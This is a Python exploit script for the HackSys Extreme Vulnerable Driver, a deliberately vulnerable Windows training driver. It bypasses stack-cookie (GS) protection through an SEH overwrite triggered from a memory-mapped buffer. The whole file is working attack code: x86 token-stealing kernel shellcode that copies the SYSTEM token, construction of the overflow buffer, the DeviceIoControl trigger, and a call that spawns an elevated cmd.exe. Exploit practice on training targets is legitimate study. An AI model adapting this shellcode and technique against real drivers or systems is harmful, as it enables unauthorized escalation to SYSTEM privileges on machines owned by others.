import ctypes, os, struct, sys, win32con
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def heap_alloc_payload():
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad
		"\x81\xC4\x8C\x07\x00\x00"	# add esp, 0x78C
		"\x8B\x3C\x24"				# mov edi, [esp] -> restore IRP ptr
		"\x81\xC4\x08\x00\x00\x00"	# add esp, 0x8
		"\x8B\x1C\x24"				# mov ebx, [esp] -> restore ptr to DbgPrint string
		"\x81\xC4\x34\x02\x00\x00"	# add esp, 0x8   -> point esp to IrpDeviceIoCtlHandler frame
		"\x31\xC0"                  # NTSTATUS -> STATUS_SUCCESS
		"\x5D"                      # pop ebp
		"\xC2\x08\x00"              # ret 8
	)
	
	payload_address = id(token_stealing_shellcode) + 20
	print "[+] Payload address: 0x%X" % payload_address
	return payload_address

def create_map_file():
	page_size = 0x1000
	FILE_MAP_ALL_ACCESS = 0x1F
	SEH_overwrite_offset = 0x214

	print "[+] Creating file mapping"
	shared_memory = kernel32.CreateFileMappingA(-1, None, win32con.PAGE_EXECUTE_READWRITE, 0, page_size, "SharedMemory")
	
	print "[+] Mapping it to current process space"
	shared_mapped_memory_address = kernel32.MapViewOfFile( shared_memory , FILE_MAP_ALL_ACCESS, 0, 0, page_size)
	print "[+] Map View of File at address: 0x%X" % shared_mapped_memory_address
	
	suitable_memory_for_buffer = shared_mapped_memory_address + (page_size - SEH_overwrite_offset)
	print "[+] Suitable Memory for Buffer address: 0x%X" % suitable_memory_for_buffer
	
	print "[+] Constructing malicious buffer"
	# [-- JUNK FOR PAGE --][-- KERNEL BUFFER SIZE--][-- STACK COOKIE --][-- JUNK --][-- SE/SHELLCODE PTR --]
	malicious_buffer = "A" * (page_size - SEH_overwrite_offset) + "B" * 0x200 + "S" * 4 + "C" * 12 + struct.pack("<L",heap_alloc_payload())
	malicious_buffer_len = len(malicious_buffer)
	
	print "[+] Copying malicious buffer to file map"
	csrc = create_string_buffer(malicious_buffer, malicious_buffer_len)
	ctypes.memmove(shared_mapped_memory_address, addressof(csrc), malicious_buffer_len)
	return suitable_memory_for_buffer, SEH_overwrite_offset
	
	
def trigger_stack_overflow_GS():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
		
	buffer_ptr, buffer_size = create_map_file()
	
	print "[+] Sending malicious buffer"
	print "[+] Triggering vuln .."
	# Note buffer_size + 4 : +4 resides outside the mapped file to trigger an exception when memcpy the region
	# before GS check, which BSODs box
	kernel32.DeviceIoControl(driver_handle, 0x222007, buffer_ptr, buffer_size + 4, None, 0,byref(dwReturn)   , None)
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[!] Exploit did not work. Re-run it!"
	
	
def preamble():
	print "\r\n"
	print "HackSys Extreme Vulnerable Driver : Stack Overflow GS"
	print "Author: @GradiusX"
	print "\r\n"
	
	
if __name__ == '__main__':
	preamble()
	trigger_stack_overflow_GS()
